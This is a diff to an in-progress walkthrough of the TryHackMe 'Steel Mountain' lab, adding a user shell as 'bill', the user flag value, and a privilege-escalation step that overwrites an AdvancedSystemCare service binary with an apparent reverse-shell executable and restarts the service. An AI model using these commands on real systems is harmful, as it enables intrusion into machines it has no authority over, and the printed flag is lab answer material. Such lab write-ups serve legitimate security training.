@@ -1,6 +1,6 @@
 # Steel Mountain (THM) — Walkthrough
 
-Status: In Progress (initial access repeatedly confirmed; privesc to SYSTEM in progress)
+Status: In Progress (stable user foothold achieved; service-binary privesc path validated; SYSTEM callback capture still pending)
 Target: 10.146.141.173
 Scope: Authorized TryHackMe lab target only
 
@@ -149,8 +149,14 @@ Goal:
 ## Current progress snapshot
 - Recon validated: 80 + 8080.
 - HFS 2.3 confirmed.
-- Multiple successful meterpreter footholds as `STEELMOUNTAIN\bill` observed.
-- Active work: deterministic privesc chain to SYSTEM with proof output.
+- Stable command-shell foothold as `STEELMOUNTAIN\\bill` re-established with user proof:
+  - `whoami` -> `steelmountain\\bill`
+  - `type C:\\Users\\bill\\Desktop\\user.txt` -> `b04763b6fcf51fcd7c13abc7db4fd365`
+- PrivEsc branch validated (service-binary replacement):
+  - `sc qc AdvancedSystemCareService9` shows `SERVICE_START_NAME : LocalSystem`
+  - `copy /Y C:\\Users\\bill\\ascrev.exe "C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe"` succeeded (`1 file(s) copied.`)
+  - Service restart commands issued (`sc stop/start AdvancedSystemCareService9`).
+- Remaining gap: capture reliable SYSTEM callback and root proof output in same run.
 
 ## Next update condition
 This walkthrough will be updated with:
